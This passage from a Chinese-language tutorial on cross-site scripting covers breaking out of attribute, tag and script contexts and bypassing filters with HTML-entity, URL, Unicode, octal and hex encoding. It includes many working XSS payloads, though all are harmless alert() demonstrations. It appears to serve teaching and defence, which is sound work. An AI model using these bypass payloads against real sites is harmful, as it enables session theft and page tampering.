type=text&gt;</span><br></pre></td></tr></table></figure><p>我们可以选择直接闭合标签：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;img src=x onerror=alert(1);&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 输出后如下:</span></span><br><span class="line"><span class="string">&lt;input value=&quot;</span><span class="string">&quot;&gt;&lt;img src=x onerror=alert(1);&gt;&quot;</span> type=text&gt;</span><br></pre></td></tr></table></figure><p>如果 <code>&lt; &gt;</code> 被过滤的话可以换成选择使用事件来闭合属性，并将后面的引号注释掉或闭合：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; autofocus onfocus=alert(1)//</span></span><br><span class="line"><span class="string">&quot;</span> autofocus onfocus=<span class="title function_">alert</span>(<span class="number">1</span>) <span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 输出后如下:</span></span><br><span class="line"><span class="string">&lt;input value=&quot;</span><span class="string">&quot; autofocus onfocus=alert(1)//&quot;</span> type=text&gt;</span><br></pre></td></tr></table></figure><p>还有一些特殊的场景，如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;[输出]&quot;</span> /&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;[输出点]&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>/&gt;</span></span></span><br></pre></td></tr></table></figure><p>这里只能把input标签闭合，然后直接执行脚本，否则会因为type为hidden导致无法执行脚本。</p><h3 id="输出在HTML标签之间"><a href="#输出在HTML标签之间" class="headerlink" title="输出在HTML标签之间"></a>输出在HTML标签之间</h3><p>例如输出的位置如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;body&quot;</span>&gt;[输出]&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>直接提交 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 即可触发XSS，但是当标签是不能执行脚本的标签时，如下面这几个：</p><ul><li><code>&lt;title&gt;&lt;/title&gt;</code></li><li><code>&lt;textarea&gt;&lt;/textarea&gt;</code></li><li><code>&lt;xmp&gt;&lt;/xmp&gt;</code></li><li><code>&lt;iframe&gt;&lt;/iframe&gt;</code></li></ul><p>那么就得先把那个标签闭合（后文会讲到原理），然后在注入XSS语句，例如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/textarea&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><h3 id="输出在script标签之间"><a href="#输出在script标签之间" class="headerlink" title="输出在script标签之间"></a>输出在script标签之间</h3><p>例如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">&quot;input&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可控位置在input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;;alert(1)//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 输出后如下:</span></span><br><span class="line"><span class="string">&lt;script&gt;var x = &quot;</span><span class="string">&quot;;alert(1)//&quot;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="字符编码绕过"><a href="#字符编码绕过" class="headerlink" title="字符编码绕过"></a>字符编码绕过</h1><p>在XSS中，还有一个绕过关键字过滤的方法，那就是字符编码绕过。这里给出一个编码网站：<a href="https://bianma.bmcx.com/">https://bianma.bmcx.com/</a></p><p>编码属于计算机系统的基础知识，其内容写起来估计也可以出本书了，不过或多或少我们都有所了解，总的来说，编码就是将字符变为二进制数，而解码就是将二进制数还原为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程，下面大概介绍一下流程。</p><h2 id="请求网页解码流程"><a href="#请求网页解码流程" class="headerlink" title="请求网页解码流程"></a>请求网页解码流程</h2><ul><li><strong>HTML 编码&#x2F;解码</strong></li></ul><p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码。</p><p>但是在HTML中有些字符是和关键词冲突的，比如 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，解码之后，浏览器会误认为它们是HTML标签，如果希望正确地显示预留字符，就需要在HTML中使用对应的HTML字符实体。</p><p>字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开头，后面跟着一个预定义的实体的名称，或用&amp;#开头+实体编号+分号来表示。</p><p>常见的HTML字符实体有：</p><table><thead><tr><th>显示结果</th><th>描述</th><th>实体名称</th><th>实体编号</th></tr></thead><tbody><tr><td></td><td>空格</td><td><code> </code></td><td><code> </code></td></tr><tr><td>&lt;</td><td>小于号</td><td><code>&lt;</code></td><td><code>&lt;</code></td></tr><tr><td>&gt;</td><td>大于号</td><td><code>&gt;</code></td><td><code>&gt;</code></td></tr><tr><td>&amp;</td><td>和号</td><td><code>&amp;</code></td><td><code>&amp;</code></td></tr><tr><td>“</td><td>引号</td><td><code>&quot;</code></td><td><code>&quot;</code></td></tr><tr><td>‘</td><td>撇号</td><td><code>&#39;</code>(IE不支持)</td><td><code>&#39;</code></td></tr></tbody></table><p>但并不是所有的字符都有实体名称，但是它们都有自己的实体编号。</p><p>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个 <code>&lt;</code> 符号（后面没有跟 <code>/</code>符号）就会进入 <strong>标签开始状态(Tag open state)</strong> ，然后转变到 <strong>标签名状态(Tag name state)</strong> 、 <strong>前属性名状态(before attribute name state)</strong> ……最后进入 <strong>数据状态(Data state)</strong> 并释放当前标签的token。当解析器处于 数据状态(Data state) 时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p><p>简单的说就是，浏览器对HTML解码之后就开始解析HTML文档，将众多标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。</p><p>所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。</p><ul><li><strong>URL 解码</strong></li></ul><p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p><p>在服务端接收到请求时，会自动对请求进行一次URL解码。</p><ul><li><strong>JavaScript 解码（只支持Unicode）</strong></li></ul><p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。</p><p>比如 <code>&lt;a href=&quot;javascript:alert(&#39;\u0031&#39;)&quot;&gt;test&lt;/a&gt;</code>，JavaScript 出发了 JavaScript 解释器，JavaScript 会先对内容进行解析，里边有一个转义字符<code>\u0031</code>，前导的 u 表示他是一个unicode 字符，根据后边的数字，解析为“1”，于是在完成 JavaScript 的解析之后变成了 <code>&lt;a href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;test&lt;/a&gt;</code>。</p><p><strong>下面用一个普通的XSS代码来说明一下浏览器对其解析的过程。</strong></p><ul><li><code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;test&lt;/a&gt;</code></li></ul><p>首先HTML解析器开始工作，并对href中的字符做HTML解码，接下来URL解析器对href值进行解码，正常情况下URL值为一个正常的URL链接，如：<code>https://www.baidu.com</code>，那么URL解析器工作完成后是不需要其他解码的，但是该环境中URL资源类型为Javascript，因此该环境中最后一步Javascript解析器还会进行解码操作，最后解析的脚本将被执行。</p><p>整个解析顺序为3个环节：HTML解码 —&gt;URL解码 —&gt;JS解码</p><p>我们可以对XSS攻击向量做这三种编码都可以成功弹框。</p><h2 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码"></a>HTML 实体编码</h2><p>我们可以将DOM节点中的内容转化为HTML实体，因为解析HTML之后建立起节点，然后会对DOM节点里面的HTML实体进行解析。HTML 编码主要分为10进制和16进制，格式为以 <code>&amp;#</code> 开头以分号 <code>;</code> 结尾（也可以不带分号）。</p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// 十进制</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 十六进制</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 也可以不带分号</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// 十进制</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 十六进制</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 也可以不带分号</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是要注意，对于HTML字符实体，并不是说任何地方都可以使用实体编码，只有处于 “数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 这三种状态中的HTML字符实体将会从 <code>&amp;#…</code> 形式解码，转化成对应的解码字符并被放入数据缓冲区中。</p><p><strong>（1）数据状态中的字符引用：</strong>数据状态就是解析一个标签内里面的内容，如 <code>&lt;div&gt;...&lt;/div&gt;</code> 中的内容，当浏览器解析完 <code>&lt;div&gt;</code> 标签之后如果发现标签内还含有实体字符的话，就会有一个实体编码解析了，如：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="symbol">&amp;#60;</span>img src=x onerror=alert(&quot;xss&quot;)<span class="symbol">&amp;#62;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如下图，此时在页面上显示的是经过转义的内容：</p><p><img src="/../images/20210523094712-cb6a83bc-bb68-1.png" alt="image-20230524205745342"></p><p>这看上去是一个标准的标签语言，但并不会触发xss，因为当前HTML解析器处于“数据状态”，不会转换到“标签开始状态”，所以就不会建立新的标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成“数据”而不是XSS攻击向量。</p><p><strong>（2）属性值状态中的字符引用：</strong>属性值状态中的字符引用就好理解了，就是src，herf这样的属性值中的HTML实体，他也是会先进行HTML解码的，比如下面的语句，会先对里面HTML解码，然后再继续往下执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>（3）RCDATA状态中的字符引用：</strong>然后再来看一下什么是RCDATA转态，这里需要我们先了解一下HTML中有五类元素：</p><ol><li>空元素(Void elements)，如 <code>&lt;area&gt;</code>、<code>&lt;br&gt;</code>、<code>&lt;base&gt;</code> 等等。空元素不能容纳任何内容，因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间。</li><li>原始文本元素(Raw text elements)，有 <code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>。原始文本元素可以容纳文本。</li><li>RCDATA元素(RCDATA elements)，有 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code>。RCDATA元素可以容纳文本和字符引用。</li><li>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素。外部元素可以容纳文本、字符引用、CDATA段、其他元素和注释。</li><li>基本元素(Normal elements)，即除了以上4种元素以外的元素。基本元素可以容纳文本、字符引用、其他元素和注释。</li></ol><p>注意到RCDATA元素中有 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code> 两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别并进行HTML编码解析。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”，所以就不会建立新的标签，所以下面这个语句触发不了XSS：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="symbol">&amp;#60;</span>script<span class="symbol">&amp;#62;</span>alert(&quot;xss&quot;)<span class="symbol">&amp;#60;</span>/script<span class="symbol">&amp;#62;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/20210523094713-cbda5a48-bb68-1.png" alt="img"></p><p>但是如果直接放进去标签的内容呢，不带转义字符呢，如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同样也是不会触发XSS的</p><p>这涉及到了RCDATA的一个特殊的情况。即在浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。在这个状态中，如果遇到“&lt;”字符，它会转换到“RCDATA小于号状态”。如果“&lt;”字符后没有紧跟着“&#x2F;”和对应的标签名，解析器会转换回“RCDATA状态”，并不会进入“标签开始状态”的。这意味着在RCDATA元素标签的内容中，唯一能够被解析器认做是标签的就只有 <code>&lt;/textarea&gt;</code> 或者 <code>&lt;/title&gt;</code>，因此，在 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code> 的内容中不会创建标签，就不会有脚本能够执行了。</p><p>另外还有一点要注意：我们从上面HTML的五类元素中还发现有一个原始文本元素 <code>&lt;script&gt;</code> 在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。浏览器看不懂中间这堆编码是和啥东西，所以也不会被执行，如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/20210523094714-cc1f779a-bb68-1.png" alt="img"></p><p>那么如何才能让里面的内容进行转义并执行弹窗呢，这里需要利用到XSS的一个黑魔法——“svg”，我们下文中会提及。</p><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>我们可以并将src或href属性中的内容进行URL编码，当HTML解析器对src或href中的字符完成HTML解码后，接下来URL解析器会对src或href中的值进行URL解码。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面给出几个实例。</p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:%61%6c%65%72%74%28%22%78%73%73%22%29</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;iframe src=javascript:alert(&quot;xss&quot;)&gt;&lt;/iframe&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意，伪协议头 <code>javascript:</code> 是不能进行编码的。这里就有一个URL解析过程中的一个细节了，即不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就会导致DOM节点中被编码的“javascript”没有被解码，当然不会被URL解析器识别了。就比如说 <code>http://www.baidu.com</code> 可以被URL编码为 <code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code>，但是不能把协议也进URL编码：<code>%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code> 。</p><p>但是伪协议头 <code>javascript:</code> 可以进行HTML编码。</p><h2 id="Javascript-编码"><a href="#Javascript-编码" class="headerlink" title="Javascript 编码"></a>Javascript 编码</h2><p>我们可以将DOM节点中的内容转化为 Javascript 编码。当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。</p><p>Javascript 中可以识别的编码类型有：</p><ul><li>Unicode 编码</li><li>八进制编码</li><li>十六进制编码</li></ul><p>一般情况下我们使用Unicode编码的比较广泛，而八进制和十六进制只有在DOM环境或eval()等函数中才可以用。</p><h3 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h3><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">\u0061\u006C\u0065\u0072\<span class="title function_">u0074</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">\u0061\u006C\u0065\u0072\<span class="title function_">u0074</span>(<span class="string">&quot;\u0078\u0073\u0073&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:\u0061\u006C\u0065\u0072\u0074(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:\u0061\u006C\u0065\u0072\u0074(</span>&quot;\<span class="attr">u0078</span>\<span class="attr">u0073</span>\<span class="attr">u0073</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但要注意，我们同样也不能对伪协议头 <code>javascript:</code> 进行 Javascript 编码。并且像圆括号、双引号、单引号这样的符号我们也不能进 Javascript 编码，但是能进行HTML编码。</p><h3 id="在DOM环境中的JavaScript编码"><a href="#在DOM环境中的JavaScript编码" class="headerlink" title="在DOM环境中的JavaScript编码"></a>在DOM环境中的JavaScript编码</h3><p>对于八进制编码和十六进制编码，与 Unicode 编码还是有区别，像下面的XSS向量是不能直接执行的：</p><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">\<span class="number">141</span>\<span class="number">154</span>\<span class="number">145</span>\<span class="number">162</span>\<span class="number">164</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:\x61\x6c\x65\x72\x74(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如下图，插入之后没有任何反应：</p><p>[<img src="/../images/20210523094714-cc651728-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094714-cc651728-bb68-1.png)</p><p>[<img src="/../images/20210523094714-cca61c3c-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094714-cca61c3c-bb68-1.png)</p><p>要想让他们能够执行我们要将他们放在DOM环境中，即DOM型的XSS。</p><p>测试代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;s&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> search = <span class="string">&quot;...&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;s&#x27;</span>).<span class="property">innerHTML</span> = search;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上情况很多都是出现在你搜索后，显示你所查询的关键字，变量 <code>search</code> 是一个可控点，当我们查询一个XSS攻击向量后，变量 <code>search</code> 就会被赋值为这个XSS向量，从而插入到div标签中触发XSS，如下所示：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;s&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> search = <span class="string">&quot;&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;s&#x27;</span>).<span class="property">innerHTML</span> = search;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094715-cce8331a-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094715-cce8331a-bb68-1.png)</p><p>此时如果过滤了 <code>&lt;</code>、<code>&gt;</code>、<code>&#39;</code>、<code>&quot;</code>、<code>&amp;</code>、<code>%</code> 等等这些字符的话，我们便可以用JavaScript编码的方法将XSS向量全部编码，即 <code>&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;</code> 的以下编码都可以弹窗：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// Unicode编码</span><br><span class="line">\u003C\u0069\u0066\u0072\u0061\u006D\u0065\u0020\u0073\u0072\u0063\u003D\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029\u003E\u003C\u002F\u0069\u0066\u0072\u0061\u006D\u0065\u003E</span><br><span class="line"></span><br><span class="line">// 八进制编码</span><br><span class="line">\74\151\146\162\141\155\145\40\163\162\143\75\152\141\166\141\163\143\162\151\160\164\72\141\154\145\162\164\50\47\170\163\163\47\51\76\74\57\151\146\162\141\155\145\76</span><br><span class="line"></span><br><span class="line">// 十六进制编码</span><br><span class="line">\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e</span><br></pre></td></tr></table></figure><p>还有一种让八进制和十六进制编码的XSS攻击向量执行的方式便是将XSS向量放在某个能把字符串当做JavaScript代码来执行的函数里，比如eval()、setTimeout()、setInterval()等函数。如下示例：</p><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&quot;\141\154\145\162\164\50\42\170\163\163\42\51&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(</span>&quot;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x22</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x22</span>\<span class="attr">x29</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span 